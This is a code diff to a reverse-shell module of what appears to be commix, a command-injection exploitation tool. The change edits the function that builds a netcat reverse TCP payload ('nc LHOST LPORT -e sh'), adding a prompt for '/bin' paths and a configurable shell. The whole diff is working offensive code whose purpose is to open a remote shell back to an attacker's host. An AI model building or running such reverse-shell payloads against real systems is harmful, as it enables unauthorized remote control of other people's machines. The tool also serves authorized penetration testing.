+++ src/core/shells/reverse_tcp.py
@@ -196,12 +196,15 @@ def check_uripath(uripath):
 Set up the netcat reverse TCP connection
 """
 def netcat_version():
+  
+  # Defined shell
+  shell = "sh"
 
   # Netcat alternatives
   NETCAT_ALTERNATIVES = [
-    "/bin/nc",
-    "/bin/busybox nc",
-    "/bin/nc.traditional"
+    "nc",
+    "busybox nc",
+    "nc.traditional"
   ]
 
   while True:
@@ -235,7 +238,29 @@ commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_netcat""" + Style.RESET_AL
       print settings.print_error_msg(err_msg)
       continue
 
-  cmd = nc_alternative + " " + settings.LHOST + " " + settings.LPORT + " -e /bin/sh"
+  while True:
+    if not menu.options.batch:
+      question_msg = "Do you want to use '/bin' standard subdirectory? [y/N] > "
+      sys.stdout.write(settings.print_question_msg(question_msg))
+      enable_bin_dir = sys.stdin.readline().replace("\n","").lower()
+    else:
+      enable_bin_dir = ""
+    if len(enable_bin_dir) == 0:
+       enable_bin_dir = "n"              
+    if enable_bin_dir in settings.CHOICE_NO:
+      break  
+    elif enable_bin_dir in settings.CHOICE_YES :
+      nc_alternative = "/bin/" + nc_alternative
+      shell = "/bin/" + shell
+      break    
+    elif enable_bin_dir in settings.CHOICE_QUIT:
+      sys.exit(0)
+    else:
+      err_msg = "'" + enable_bin_dir + "' is not a valid answer."  
+      print settings.print_error_msg(err_msg)
+      pass
+
+  cmd = nc_alternative + " " + settings.LHOST + " " + settings.LPORT + " -e " + shell
 
   return cmd